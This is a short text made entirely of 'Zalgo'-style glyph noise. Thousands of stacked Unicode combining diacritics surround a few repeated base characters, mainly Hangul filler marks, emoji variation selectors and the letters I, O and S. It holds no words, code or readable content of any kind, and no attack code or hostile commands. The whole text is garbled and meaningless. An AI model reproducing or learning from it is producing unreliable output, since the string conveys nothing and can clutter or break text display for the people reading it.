̧̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̛̛̛̛̛͓̻̬͙̦̙̭̪̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅ